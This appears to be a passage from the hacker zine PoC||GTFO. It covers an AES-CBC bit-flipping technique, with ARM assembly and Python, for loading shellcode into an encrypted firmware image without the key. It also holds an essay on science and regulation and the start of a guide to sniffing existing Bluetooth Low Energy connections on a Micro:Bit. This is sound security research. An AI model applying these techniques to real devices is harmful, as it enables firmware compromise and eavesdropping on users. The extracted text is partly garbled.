tion vector to flip bits of the first cleartext block.
On page 5, Albert Spruyt and Niek Timmers share
some handy tricks for using a similar property: by
flipping bits of one block’s ciphertext you can also
flip blocks of the subsequent ciphertext block after
decryption. In this manner, they can sacrifice half
of the blocks by flipping their bits to control the
other half, loading shellcode into the cleartext of an
encrypted ARM image for which they have no key.
Our own Pastor Laphroaig has a sermon for you
on page 9, concerning the good ol’ days of juvenile
science fiction, when chemistry sets were dangerous
and Dr. Watson trusty pistol was always at hand.
Software defined radios and radios built from
custom hardware can receive damned near anything
these days, but some of the most clever radio hack-
ing involves firmware patches to existing, commod-
ity radios. On page 13, Damien Cauquil shows us
how to write custom firmware for the nRF51 chip
in the BBC Micro:Bit to sniff an ongoing Bluetooth
Low Energy connection, without previously know-
ing the hop interval, increment, or even the channel
map.
Speaking of PHY layer tricks, what does a clever
neighbor do when he hasn’t got a hardware PHY?
For Ethernet, Andrew Zonenberg simply bitbangs it
from an old Spartan-6 FPGA and the right resistors.
Page 21.
When assembling hardware, sometimes it can be
ambiguous whether a chip is inserted one way, or
rotated one hundred and eighty degrees from that
way. On page 32, Joe Grand shares with us a DIP-8
design that selectively re-adjusts itself to having the
chip rotated. Build your PCB by the ferric chloride
method with a 0.1” DIP socket for proper nostalgia.
Back in the good ol’ days, folks would share
hooking techniques over a pint of good ale. Now
that pints have as few as eight ounces, and some jerk
ranting about Bitcoin ruins all our conversations,
it’s nice to read that Shawn Webb has been playing
with methods for hooking functions in FreeBSD pro-
cesses through unprivileged ptrace() debugging.
Page 34.
Page 42 features a gumshoe detective novella,
one in which Soldier of Fortran hangs out his neon
sign and teams up with Bigendian Smalls to cre-
ate the niftiest EBCDIC login screen for his z/OS
mainframe.
Leandro Pereira has some clever tricks on
page 56 for injecting additional code into pre-
existing ELF files to enable defensive features
through seccomp-bpf.
On page 60, the last page, we pass around the
collection plate. Our church has no interest in bit-
coins or wooden nickels, but we’d love your donation
of a reverse engineering story. Please send one our
way.
3417:02
Constructing AES-CBC Shellcode
by Albert Spruyt and Niek Timmers
Howdy folks!
Imagine, if you will, that you have managed to
bypass the authenticity measures (i.e., secure boot)
of a secure system that loads and executes an binary
image from external flash. We do not judge, it does
not matter if you accomplished this using a fancy
attack like fault injection 1 or the authenticity mea-
sures were lacking entirely. 2 What’s important here
is that you have gained the ability to provide the
system with an arbitrary image that will be happily
executed. But, wait! The image will be decrypted
right? Any secure system with some self respect will
provide confidentiality to the image stored in exter-
nal flash. This means that the image you provided
to the target is typically decrypted using a strong
cryptographic algorithm, like AES, using a cipher
mode that makes sense, like Cipher-Block-Chaining
(CBC), with a key that is not known to you!
Works of exquisite beauty have been made with
the CBC-mode of encryption. Starting with hum-
ble tricks, such as bit flipping attacks, we go to
heights of dizzying beauty with the padding-oracle-
attack. However, the characteristics of CBC-mode
provide more opportunities. Today, we’ll apply its
bit-flipping characteristics to construct an image
that decrypts into executable code! Pretty nifty!
Cipher-Block-Chaining (CBC) mode
The primary purpose of the CBC-mode is prevent-
ing a limitation of the Electronic Code Book (ECB)
mode of encryption. Long story short, the CBC-
mode of encryption ensures that plain-text blocks
that are the same do not result in duplicate cipher-
text blocks when encrypted. Below is an ASCII art
depiction of AES decryption in CBC-mode. We de-
note a cipher text block as CT i and a plain text block
as PT i .
CT-1
CT-2
|_______
|_______ . . .
|
|
|
_________
|
_________
|
| | |
|
IV ---
|
AES
| | |
AES
|
| |_________| | |_________|
|
|
|
|
|______XOR
|______XOR
|
|
PT-1
PT-2
An important aspect of CBC-mode is that the
decryption of CT 2 depends, besides the AES decryp-
tion, on the value of CT 1 . Magically, without know-
ing the decryption key, flipping 1 or more bits in CT 1
will flip 1 or more bits in PT 2 .
Let’s see how that works, where ∧1 denotes flip-
ping a bit at an arbitrary position.
CT 1 ∧ 1 + CT 2
Which get decrypted into:
TRASH + PT 2 ∧ 1
1 Bypassing
Secure Boot using Fault Injection, Niek Timmers and Albert Spruyt, Black Hat Europe 2016
— Deeper Inside, Jason Dellaluce
2 Arm9LoaderHax
5A nasty side effect is that we completely trash
the decryption of CT 1 but, if we know the contents
of PT 2 , we can fully control PT 2 to our heart’s de-
light! All this magic can be attributed to the XOR
operation being performed after the AES decryp-
tion.
block or more somewhere in the original encrypted
image. Now that we cleared this up, let’s see how
we can we construct a payload that will correctly
execute under these restrictions!
Chaining multiple blocks
Payload and Image construction
We now know how to control a single block de-
crypted using CBC-mode by trashing another. But
what about the rest of the image? Well, once we
make peace with the fact that we will never control
everything, we can try to control half! If we con-
sider the bit-flipping discussion above, let’s consider
the following image encrypted with AES-128-CBC,
for which we do not control the IV:
Obviously we want to do something useful; that is,
to execute arbitrary code! As an example, we will
write some code that prints a string on the serial in-
terface that allows us to identify a successful attack.
For the hypothetical target that we have in mind,
this can be accomplished by leveraging the function
SendChar() that enables us to print characters on
the serial interface. This type of functionality is
commonly found on embedded devices.
CT 1 + CT 2 + CT 3 + CT 4 + ...
Which gets decrypted into:
We would like to execute shellcode like the fol-
lowing: beacon out on the UART and let us know
that we got code execution, but there’s a bit of a
problem.
PT 1 + PT 2 + PT 3 + PT 4 + ...
No magic here! All is decrypted as expected.
However, once we flip a bit in CT 1 , like:
CT 1 ∧ 1 + CT 2 + CT 3 + CT 4 + ... 1
Then, on the next decryption, it means we trash
PT 1 but control PT 2 , like: 3
5
TRASH + CT 2 ∧ 1 + PT 3 + PT 4 + ...
The beauty of CBC-mode is that with the same
ease we can provide:
7
9
11
CT 1 ∧ 1 + CT 2 + CT 1 ∧ 1 + CT 2 + ...
mov r0 ,#0 x50
l d r r5 , [ pc , # 0 ]
b skip
. word 0xCACAB0B0
skip :
bl r5
mov r0 ,#0 x 6 f
bl r5
mov r0 ,#0 x43
bl r5
inf_loop :
b inf_loop
; r 0 = ’P ’
; pc i s 8 b y t e s ahead
; a d d r e s s o f SendChar
;
;
;
;
;
;
Call
r0 =
Call
r0 =
Call
loop
SendChar
’o ’
SendChar
’C ’
SendChar
endlessly
Which results in:
TRASH + CT 2 ∧ 1 + TRASH + CT 2 ∧ 1 + ...
This piece of code spans multiple 16-byte blocks,
which is a problem as we only partially control the
decrypted image. There will always be a trashed
block in between controlled blocks. We mitigate this
problem by splitting up the code into snippets of
twelve bytes and by adding an additional instruc-
tion that jumps over the trashed block to the next
controlled block. By inserting place holders for the
trash blocks we allow the assembler to fill in the
right offset for the next block. Once the code is
assembled, we will remove the placeholders!
Using this technique we can construct an im-
age in which we control half of the blocks by only
knowing a single plain-text/cipher-text pair! But,
this makes you wonder, where can we obtain such
a pair? Well, we all know that known data (such
as 00s or FFs) is typically appended to images in
order to align them to whatever size the developer
loves. Or perhaps we know the start of an image!
Not completely unlikely when we consider exception
vectors, headers, etc. More importantly, it does not
matter what block we know, as long as we know a
6;;
2
4
placeholder f o r trash block
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
6
first_block :
mov r1 , r 1
; Useless f i r s t block
mov r2 , r 2
10
mov r3 , r 3
b s e co n d _ b l o c k
12
; ; placeholder f o r trash block
14
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
16
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
18
s e c o nd _ b l o c k :
20
mov r0 ,#0 x50
; r 0 = ’P ’
l d r r5 , [ pc , # 0 ]
; pc i s 8 b y t e s ahead
22
b third_block
. word 0xCACAB0B0 ; a d d r e s s o f SendChar
24
; ; placeholder f o r trash block
26
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
28
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
30
third_block :
32
bl r5
; C a l l SendChar
mov r0 ,#0 x 6 f
; r0 = ’ o ’
34
bl r5
; C a l l SendChar
b forth_block
36
; ; placeholder f o r trash block
38
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
40
. word 0 x d e a d b e e f
. word 0 x d e a d b e e f
42
forth_block :
44
mov r0 ,#0 x43
; r 0 = ’C ’
bl r5
46 i n f _ l o o p :
b inf_loop
48
nop
; Unused s p a c e
8
# ## PLAINTEXT ###
2 12121212121212121212121212121212
34343434343434343434343434343434
4 56565656565656565656565656565656
78787878787878787878787878787878
6
# ## CIPHERTEXT ###
8 d3875385eb0f7e5de539f1ee10b91b7b
18 f a 4 7 c 2 6 3 3 8 f a 5 8 f 5 8 1 e 6 e 4 a 3 3 d 1 9 4 8
10 6 d00a4edb8bed131ebbb41399b8946c9
26 b d c 5 5 6 c 9 4 c 5 2 8 b 3 f e 0 1 a 8 e 5 4 a 2 9 c d 2
12
# ## PAYLOAD ###
14 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1
22222222222222222222222222222222
16
# ## IMAGE ###
18 f 6 a 2 7 6 a 0 c e 2 a 5 b 7 8 c 0 1 c d 4 c b 3 5 9 c 3 e 5 e
18 f a 4 7 c 2 6 3 3 8 f a 5 8 f 5 8 1 e 6 e 4 a 3 3 d 1 9 4 8
20 c 5 9 1 4 5 9 3 f d 1 9 6 8 4 b f 3 2 f e 7 f 8 0 6 a f 0 d 6 d
18 f a 4 7 c 2 6 3 3 8 f a 5 8 f 5 8 1 e 6 e 4 a 3 3 d 1 9 4 8
22
# ## DECRYPTED ###
24 6210 e 4 1 a 2 6 3 5 7 e 3 a d c 1 0 7 4 7 5 5 3 d 1 7 a e a
11111111111111111111111111111111
26 a 0 a 3 5 e a d 8 1 5 a 3 e 2 b 8 f f 5 4 f 0 2 9 9 6 1 4 2 1 1
22222222222222222222222222222222
In a real world scenario it is likely that we do
not control the IV. This means, execution starts
from the beginning of the image, we’ll need to sur-
vive executing the first block which consists of ran-
dom bytes. This can accomplished by taking the
results from PoCkGTFO 14:06 into account where
we showed that surviving the execution of a random
16-byte block is somewhat trivial (at least on ARM).
Unless very lucky, we can generate different images
with a different first block until we can profit!
We hope the above demonstrates the idea con-
cretely so you can construct your own magic CBC-
mode images! :)
–——–
———
—–—–
Once again we’re reminded that confidentiality is
not the same as integrity, none of this would be pos-
sible if the integrity of the data is assured. We also,
once again, bask in the radiance of the CBC-mode of
encryption. We’ve seen that with some very simple
operations, and a little knowledge of the plain-text,
we can craft half-controlled images. By simply skip-
ping over the non-controllable blocks, we can ac-
tually create a fully functional encrypted payload,
while having no knowledge of the encryption key.
If this doesn’t convince you of the majesty of CBC
then nothing will.
Let’s put everything together and write some
Python (Figure 1) to introduce the concept to you in
a language we all understand, instead of that most
impractical of languages, English. We use a differ-
ent payload that is easier to comprehend visually.
Obviously, nothing prevents you from replacing the
actual payload with something useful like the pay-
load described earlier or anything else of your liking!
7from Crypto . C iph er import AES
2
def p r i n t B l o c k s ( t i t l e , b i n S t r i n g ) :
print " \n###" , t i t l e , "###"
f o r i in xrange ( 0 , len ( b i n S t r i n g ) , 1 6 ) :
6
print b i n S t r i n g [ i : i + 1 6 ] . e nc od e ( " hex " )
4
8 def x o r ( s1 , s 2 ) :
return ’ ’ . j o i n ( [ chr ( ord ( a ) ^ord ( b ) ) f o r a , b in zip ( s1 , s 2 ) ] )
10
#
12 ## Prepare t h e normal image
#
14 IV = " \xFE" ∗ 16
KEY = " \ x88 " ∗ 16
16 PLAINTEXT = " \ x12 " ∗16 + " \ x34 " ∗16 + " \ x56 " ∗16 + " \ x78 " ∗16
18 CIPHERTEXT = AES . new (KEY, AES .MODE_CBC, IV ) . e n c r y p t (PLAINTEXT)
20 p r i n t B l o c k s ( "PLAINTEXT" , PLAINTEXT)
p r i n t B l o c k s ( "CIPHERTEXT" , CIPHERTEXT)
22
#
24 ## Make t h e h a l f c o n t r o l l e d image , we u s e 2 CTs and 1 PT
## from t h e o r i g i n a l e n c r y p t e d image
26 #
knownCipherText = CIPHERTEXT [ 1 6 : 3 2 ]
28 p r e v C i p h e r T e x t = CIPHERTEXT [ 0 : 1 6 ]
knownPlainText = PLAINTEXT [ 1 6 : 3 2 ]
30
AESoutput = x o r ( prevCipherText , knownPlainText )
32
# Output o f t h e a s s e m b l e r w i t h , p l a c e h o l d e r b l o c k s removed
34 p a y l o a d = ’ 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 ’ \
’ 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 ’ . de co de ( ’ hex ’ )
36
p r i n t B l o c k s ( "PAYLOAD" , p a y l o a d )
38
IMAGE = " "
40 f o r i in range ( 0 , len ( p a y l o a d ) , 1 6 ) :
IMAGE += x o r ( AESoutput , p a y l o a d [ i : i +16])
42
IMAGE += knownCipherText
44 p r i n t B l o c k s ( "IMAGE" ,IMAGE)
46 #
## What would t h e d e c r y p t e d image l o o k l i k e ?
48 #
DECRYPTED = AES . new (KEY, AES .MODE_CBC, IV ) . d e c r y p t (IMAGE)
50 p r i n t B l o c k s ( "DECRYPTED" ,DECRYPTED)
Figure 1. Python to Force a Payload into AES-CBC
817:03
In the Company of Rogues:
Pastor Laphroaig’s Tall Tales of Science and of Fiction
by P.M.L.
Gather ’round, neighbors. The time for carols
and fireside stories is upon us. So let’s talk about lit-
erature, the heart-warming stories of logic, science,
and technology. For even though Santa Claus, Sher-
lock Holmes, and Captain Kirk are equally imagi-
nary, their impact on us was very real, but also very
different at the different times of our lives, and we
want to give them their due.
Fiction, of course, works by temporary suspen-
sion of disbelief in made-up things, people, and cir-
cumstances, but some made-up things make us raise
our eyebrows higher than others. Still, the weirdest
part is that the things that are hard to believe in
the same story sometimes change with time!
So I was recently re-reading some Sherlock
Holmes stories, and a thought struck me: in the
modern world that succeeded Conan Doyle’s Lon-
don, both Mr. Holmes and Dr. Watson would, in
fact, be criminals.
Consider: Holmes’ use of narcotics to stimulate
his brain in the absence of a good riddle would surely
end up with the modern, scientifically organized po-
lice sending him to prison rather than deferentially
consulting him on their cases. What’s more, with all
his chemical kit and apparatus, they’d be congratu-
lating themselves on a major drug lab bust. Even if
Dr. Watson escaped prosecution as an accomplice,
he’d likely lose his medical license, at the very least.
Nor would that be Dr. Watson’s only problem.
Consider his habit of casually sticking his revolver
in his coat pocket when going out to confront some
shady and violent characters that his friend’s inter-
ference with their intended victims would severely
upset. This habit would as likely as not land him
in serious trouble. His gun crimes were, of course,
not as bad as Holmes’—“...when Holmes in one of his
queer humors would sit in an arm-chair with his hair
trigger and a hundred Boxer cartridges, and proceed
to adorn the opposite wall with a patriotic V.R. done
in bullet pocks,...”—but would be quite enough to put
the good doctor away among the very classes of so-
ciety that Mr. Holmes was so knowledgeable about.
I wonder what would surprise Sir Arthur Conan
Doyle, KStJ, DL more about our scientific moder-
nity: that an upstanding citizen would need special
permission to defend himself with the best mechan-
ical means of the age when standing up for those
abused by the violent bullies of the age, or that such
citizens would need a license to own a chemistry
lab with boiling flasks, Erlenmeyer flasks, adapter
tubes, and similar glassware, 3 let alone the chemi-
cals.
Just imagine that a few decades from now the
least believable part of a Gibson cyberpunk novel
might be not the funky virtual reality, but that the
protagonist owns a legal debugger. Why, owning
a road-worthy military surplus tank sounds less far
fetched!
In Conan Doyle’s stories, Mr. Holmes and Dr.
Watson represented the best of the science and tech-
minded vanguard of their age. Holmes was an ap-
plied science polymath, well versed in chemistry,
physics, human biology, and innumerable other
things. Even his infamous indifference to the Coper-
nican theory 4 is likely due to his unwillingness to
repeat the dictums that a member of the contem-
porary good society had to “know,” i.e., know to
repeat, without thinking about them first. As for
3 Regulated
as “drug precursors” by, e.g., Texas Department of Public Safety.
surprise reached a climax, however, when I found incidentally that he was ignorant of the Copernican Theory and of
the composition of the Solar System. That any civilized human being in this nineteenth century should not be aware that the
earth travelled round the sun appeared to be to me such an extraordinary fact that I could hardly realize it.”
—A Study in Scarlet.
4 “My
9Dr. Watson, his devotion to science is seriously
underappreciated—just imagine what sort of stinky,
loud, and occasionally explosive messes he opted to
put up with. It takes a genuine conviction of the
value of scientific experiment to do so, his respect
for Sherlock notwithstanding.
Just in case you wonder how Dr. Watson’s trusty
revolver fits into this, remember that in his time it
represented the pinnacle of mechanical and chemical
engineering, just like rocketry did some half a cen-
tury later. In fact, the Boxer from a couple of para-
graphs back, Col. Edward Mounier Boxer, F.R.S.,
besides inventing the modern centerfire primer that
Holmes used in his Webley to spell Queen Victoria’s
initials and that we use to this day in our ammo, also
designed an early two-stage rocket. This same prin-
ciple of rocketry was later used by Robert Hutchings
Goddard.
–——–
———
—–—–
But of course times change, and we change with
them. So I put that book aside, and opened another,
which was rockets and space travel all over: a Hein-
lein juvenile novel, Rocket Ship Galileo. Heinlein’s
juvies are a great way to remind yourself about the
basics of space flight and celestial mechanics—but I
wish I hadn’t, neighbors, not in the frame of mind I
was in.
Granted, juvie fiction is bound to stretch the
truth a little, to give teenagers a place in the adult
action to aspire to. But this is the kind of a stretch
that inspired the first generation of actual NASA
engineers. The characters of the former NASA en-
gineer’s memoir Rocket Boys built homemade rock-
ets just like Heinlein’s teen protagonists. Just like
Heinlein’s fictional teens, they initially got into trou-
ble for it, and were similarly rescued by adults who
used their discretion rather than today’s zero toler-
ance polices.
Now you can read the book or watch the movie,
October Sky, and count the felonies a teenager
these days would rack up for trying the things that
brought the author, Homer H. Hickam, Jr., from a
West Virginia coal mining town to NASA.
And speaking of movies, neighbors, do you re-
call that Star Trek episode, Arena, in which Cap-
tain Kirk is dumped on a primitive world and made
to fight a hostile reptilian alien? The fight is ar-
ranged by a powerful civilization annoyed by Kirk’s
and the Gorn’s ships dog-fighting in their space; it
somehow fits their sense of justice to reduce a space-
ship battle to single combat of the captains. Both
combatants are deprived of any familiar tools, but
You see, in this 1947 novel three teenagers, who
dabble in rocketry and earn their rocket pilot li-
censes, are taken to the Moon by their uncle, a nu-
clear physicist and space flight expert. The only
people who try to stop them, under the pretext of
“endangering minors,” are actual Nazis—and the lo-
cal sheriff sees right through them. So The Galileo
lifts off to seek adventure and handy explanations
of the scientific method, the crowd and the state
police cheer, and the stranger with the fake minor
protection injunction is taken into custody.
Now that was 1948. Many things changed since
then. Vertical landing of space rockets, which made
the reader of these juvies cringe just a few years ago,
has become a technical reality. But a sheriff approv-
ing of a risky activity with mere parental consent
is what really stretches belief nowadays; the Moon
Nazis with their fake child protection order would’ve
won easily.
10the alien Gorn is much, much stronger, and easily
tosses Kirk around.
Of course, all of that was just the setup for a
classic story of science education. Kirk saves himself
and his ship by spotting the ingredients for making
black powder, then using the concoction to disable
his scaly, armored opponent closing for the kill.
I wonder, though: would the black powder hack
have occurred so easily to Kirk if he—and the
screenwriters, and a significant part of the 1960s
audience expected to appreciate the trick—hadn’t
as teenagers experimented with making things go
boom? And, if they hadn’t, would there even be a
Star Trek—and the space program?
Think about the irony of this, neighbors. The en-
lightened opinion of our age is all about the virtues
of STEM, but it punishes with a heavy hand ex-
actly those interests that propelled the actual sci-
ence and technology, because they could be danger-
ous. And what’s dangerous must be banned, and
children must be taught to fear and shun it, from
grade school onward.
Such skills used to be synonymous with basic sci-
ence training. Now, for all practical purposes, they
are synonymous with school suspension if you are
lucky, or a criminal record if you aren’t.
How did we come to this?
11thing vaguely scientific against the background of
some generic lab equipment. It doesn’t really take
long for kids to learn that looking for potentia in
scientia means trouble; and who cares for scientia
that is not potentia?
Open a newspaper, neighbors, and you will see a
lot of folks calling each other “anti-science,” as one of
the worst possible pejoratives. Yet I wonder: what
harms science more than banning its basic techno-
logical artifacts from common use, be they mechan-
ical, chemical, electronic, or even mathematical? 5
And, should it come to calling the shots on ban-
ning things, would you rather have the people who
proclaim the importance of science but have zero
interest in tinkering with its actual artifacts, or the
actual tinkerers who obsessively fix cars, hand-load
ammo, or write programs?
The world has become a much stranger place
since the time when our classic tales of logic, sci-
ence, and technology were written. We will yet have
to explain again and again that doctors don’t cause
epidemics, 6 that engineers don’t cause murder or
terrorism; and that hackers do not cause computer
crime.
Yet through all of this, may we remember to keep
building our own bird feeders, and to let our neigh-
bors build theirs, even when we disapprove of theirs
just as they might disapprove of ours. For this is the
only way for progress to happen: in freedom and by
regular, non-special people making risky things that
have power and learning to make them better. Thus
and only thus do the tall tales of science and tech-
nology come true. Amen.
Somewhere along the way of technological
progress we have picked up a fallacy that grew and
grew, until it became the default way of thinking—so
entrenched that one needs an effort to nail it down
explicitly, in so many words.
It is the idea that progress somehow means
and requires banning or suppressing the danger-
ous things, the risky things, the tools that could
be abused to cause harm. If the tool and the skill
are too useful to be expunged entirely, they must be
limited to special people who have superior abilities,
and who are emphatically not you.
Verily I tell you, neighbors: although it may feel
fine to suffer the ban on a tool or a skill that nei-
ther you nor anyone you know cares to use, it is not
progress you are getting this way; it is the very op-
posite. For when some tools are deemed to be too
powerful and too dangerous to be left in your hands,
the same fallacy will come for your actual favorite
tools, and sooner than you think. The folks inclined
to listen to your explanations of why your tools are
not evil will be too few and far between.
Knowledge is power, “Scientia potentia est.”
Power, by definition, is dangerous and can be mis-
used. When the possibility of misuse gets to be
enough grounds for banning a technology to the pub-
lic, it’s only a matter of time till you are deemed
unworthy to wield the power of knowledge without
permission. Good luck with hoping that the bu-
reaucracy set up to manage these permissions will
be sympathetic towards your interests.
And then, of course, the well-meaning commu-
nity leaders, lawmakers, and officials will wonder
why people’s interest in their approved version of
STEM is lacking, despite all the glossy pictures of
happy kids and smiling adult models doing some-
5 As is the case with the recent government initiatives in the ever so science-friendly states of New York and California that
aimed to make it a crime to sell a well-encrypted smartphone.
6 A pinboard in my doctor’s office now sports an official memo from a “Department of Public Health” that knows better than
my doctor how to treat his patients. It mentions an opioid epidemic apparently caused by doctors. Consider this the next time
you feel inclined to scoff at your ancestors’ unenlightened notion that doctors were to blame for the plagues.
1217:04
Sniffing BTLE with the Micro:Bit
by Damien Cauquil
Howdy y’all!
It’s well known that sniffing Bluetooth Low En-
ergy communications is a pain in the bottom, unless
you have specialty tools like the Ubertooth One and
its competitors. During my exploration of the BBC
Micro:Bit, I discovered the very interesting fact that
it may be used to sniff BLE communications.
The BBC Micro:Bit is a small device based on
a nRF51822 transceiver made by Nordic Semicon-
ductor, with a 5 × 5 LED screen and two buttons
that can be powered by two AAA batteries. The
nRF51822 is able to communicate over multiple pro-
tocols: Enhanced ShockBurst (ESB), ShockBurst
(SB), GZLL, and Bluetooth Low Energy (BLE).
Nordic Semiconductor provides its own im-
plementation of a Bluetooth Low Energy stack,
released in what they call a SoftDevice and a
well-known closed-source sniffing firmware used in
Adafruit’s BlueFriend LE sniffer for instance. That
doesn’t help that much, as this firmware relies on
BLE connection requests to start following a specific
connection, and not on packets exchanged between
two devices in an existing connection. So, I found
no way to cheaply sniff an existing BLE connection.
In this short article, I’ll describe how to imple-
ment a Bluetooth Low Energy sniffer as software
on the BBC Micro:Bit that can follow pre-existing
connection despite channel hopping. In cases where
channel remapping is in use, it can sniff connections
on which even the Ubertooth currently fails.
The Goodspeed Way of Sniffing
a SPI bus), we must change multiple parameters in
order to sniff BLE packets over the air.
First, we need to enable the processor high fre-
quency clock because it is required before enabling
the RADIO module of the nRF51822. This is done
with the following code.
1 NRF_CLOCK −>EVENTS_HFCLKSTARTED = 0 ;
NRF_CLOCK −>TASKS_HFCLKSTART = 1 ;
3 while (NRF_CLOCK −>EVENTS_HFCLKSTARTED == 0 ) ;
Then, we must specify the mode, addresses,
power and frequency our nRF51822 will be tuned
to.
1 /∗ Max power . ∗/
NRF_RADIO −>TXPOWER = (
3
RADIO_TXPOWER_TXPOWER_0dBm
<< RADIO_TXPOWER_TXPOWER_Pos) ;
5
/∗ S e t t i n g a d d r e s s e s . ∗/
7 NRF_RADIO −>TXADDRESS = 0 ;
NRF_RADIO −>RXADDRESSES = 1 ;
9
/∗ BLE c h a n n e l s a r e n o t c o n t i g u o u s , so you
11
need t o c o n v e r t them i n t o f r e q u e n c y
o f f s e t . ∗/
13 NRF_RADIO −>FREQUENCY =
channel_to_freq ( channel ) ;
15
/∗ S e t BLE d a t a r a t e . ∗/
17 NRF_RADIO −>MODE = (RADIO_MODE_MODE_Ble_1Mbit
<< RADIO_MODE_MODE_Pos) ;
19
/∗ S e t t h e b a s e a d d r e s s . ∗/
21 NRF_RADIO −>BASE0 = 0 x00000000 ;
NRF_RADIO −>PREFIX0 = 0xAA ; // p r e a m b l e
The Micro:Bit being built upon a nRF51822, it ig-
nited a sparkle in my mind as I remembered the
hack found by our great neighbor Travis Goodspeed
who managed to turn another Nordic Semiconduc-
tor transceiver (nRF24L01+) into a sniffer. 7 I was
wondering if by any chance this nRF51822 would
have been prone to the same error, and therefore
could be turned into a BLE sniffer.
It took me hours to figure out how to reproduce
this exploit on this chip, but in fact it works exactly
the same way as described in Travis’ paper. Since
the nRF51822 is a lot different than the nRF24L01+
(as it includes its own CPU rather being driven by
7 unzip
8 unzip
The trick here, as described in Travis’ paper, is
to use an address length of two bytes instead of the
five bytes expected by the chip. The address length
is stored in a configuration register called PCNF0,
along with other extra parameters. The PCNF0 and
PCNF1 registers define the way the nRF51822 will
behave: its endianness, the expected payload size,
the address size and much more documented in the
nRF51 Series Reference Manual. 8
The following lines of code configure the
nRF51822 to use a two-byte address, big-endian
with a maximum payload size of 10 bytes.
pocorgtfo17.pdf promiscuousnrf24l01.pdf # Promiscuity is the nRF24L01+’s Duty
pocorgtfo17.pdf nrf51.pdf
13we determine a valid access address based on the
number of times we have seen it combined with a
filter on its dewhitened header. We may also want
to rely on the way the access address is generated, as
the core specifications give a lot of extra constraints
access address must comply with, but it is not al-
ways followed by the different implementations of
the Bluetooth stack.
Once we found a valid access address, the next
step consists in recovering the initial CRC value
which is required to allow the nRF51822 to auto-
matically check every packet CRC and let only the
valid ones go through. This process is well docu-
mented in Mike Ryan’s paper and code, so we won’t
repeat it here.
With the correct initial CRC value and access
address in hands, the nRF51822 is able to sniff a
given connection’s packets, but we still have a prob-
lem. The BLE protocol implements a basic channel
hopping mechanism to avoid sniffing. We cannot sit
on a channel for a while without missing packets,
and that’s rather inconvenient.
// LFLEN=0 b i t s , S0LEN=0, S1LEN=0
2 NRF_RADIO −>PCNF0 = 0 x00000000 ;
// STATLEN=10 , MAXLEN=10 , BALEN=1,
4 // ENDIAN=0 ( l i t t l e ) , WHITEEN=0
NRF_RADIO −>PCNF1 = 0x00010A0A ;
Eventually, we have to disable the CRC compu-
tation in order to make the chip consider any data
received as valid.
1 NRF_RADIO −>CRCCNF = 0 x0 ;
Identifying BLE Connections
With this setup, we can now receive crappy data
from the 2.4GHz bandwidth and hopefully some
BLE packets. The problem is now to find the needle
in the haystack, that is a valid BLE packet in the
huge amount of data received by our nRF51822.
A BLE packet starts with an access address, a
32-bit carefully-chosen value that uniquely identifies
a link between two BLE devices, as specified in the
Bluetooth 4.2 Core Specifications document. This
access address is followed by some PDU and a 3-
byte CRC, but this CRC value is computed from
a CRCInit value that is unique and associated with
the connection. The BLE packet data is whitened in
order to make it more tamper-resistant, and should
be dewhitened before processing. If the connection
is already initiated, as it is our case, the PDU is a
Data Channel PDU with a specific two-byte header,
as stated in the Bluetooth Low Energy specifica-
tions.
When a BLE connection is established, keep-
alive packets with a size of 0 bytes are exchanged
between devices.
Again, we follow the same methodology as
Travis’ by listing all the candidate access addresses
we get, and identifying the redundant ones. This is
the same method chosen by Mike Ryan in its Uber-
tooth BTLE tool from WOOT13, 9 with a nifty trick:
9 unzip
pocorgtfo17.pdf woot13-ryan.pdf
141 f u n c t i o n pickUniqueChannel ( a_channelMap ) :
aa _s eq uen ce s = g e n e r a t e S e q u e n c e s ( a_channelMap )
3
f o r c h a n n e l in range ( 0 . . 3 7 ) do :
i f ( a_channelMap c o n t a i n s c h a n n e l ) then do :
5
f o r i n c r e m e n t in range ( 0 . . 1 2 ) do :
count = 0
7
f o r i in range ( 0 . . 3 7 ) do :
i f aa _s eq uen ce s [ i n c r e m e n t ] [ i ] == c h a n n e l then do :
9
count = count + 1
i f count > 1 then do :
11
break
end i f
13
end i f
end f o r
15
i f count == 1 then do :
17
return c h a n n e l
end i f
19
end f o r
end i f
21
end f o r
23
return −1
end f u n c t i o n
25
f u n c t i o n computeRemapping ( a_channelMap ) :
a_remapping = [ ]
j = 0
29
f o r c h a n n e l in range ( 0 . . 3 7 ) do :
i f a_channelMap c o n t a i n s c h a n n e l then do :
31
a_remapping [ j ] = c h a n n e l
j = j + 1
33
end i f
end f o r
35
return a_remapping
37 end f u n c t i o n
27
39 f u n c t i o n g e n e r a t e S e q u e n c e s ( a_channelMap ) :
aa _s eq uen ce s = [ ] [ ]
41
remapping = computeRemapping ( a_channelMap )
f o r i in range ( 0 . . 1 2 ) do :
43
aa _s equ en ce s [ i ] = g e n e r a t e S e q u e n c e ( i +5 , a_channelMap , a_remapping )
end f o r
45
return aa _s eq uen ce s
end f u n c t i o n
47
f u n c t i o n g e n e r a t e S e q u e n c e ( i n c r e m e n t , a_channelMap , a_remapping ) :
49
channel = 0
a_sequence = [ ]
51
f o r i in range ( 0 . . 3 7 ) do :
i f i in a_channelMap then do :
53
sequence [ i ] = channel
else
55
s e q u e n c e [ i ] = a_remapping [ c h a n n e l modulo s i z e o f a_remapping ]
end i f
57
c h a n n e l = ( c h a n n e l + i n c r e m e n t ) % 37
59
end f o r
end f u n c t i o n
Figure 2. Hopping Algorithm
15Following the Rabbit
The Bluetooth Low Energy protocol defines 37 dif-
ferent channels to transport data. In order to com-
municate, two devices must agree on a hopping se-
quence based on three characteristics: the hop in-
terval, the hop increment, and the channel map.
The first one, the hop interval, is a value spec-
ifying the amount of time a device should sit on a
channel before hopping to the next one. The hop
increment is a value between 5 and 16 that specifies
the number of channels to add to the current one
(modulo the number of used channels) to get the
next channel in the sequence. The last one may be
used by a connecting device to restrict the channels
used to the ones given in a bitmap. The channel map
was quite a surprise for me, as it isn’t mentioned in
Ubertooth’s BTLE documentation. 10
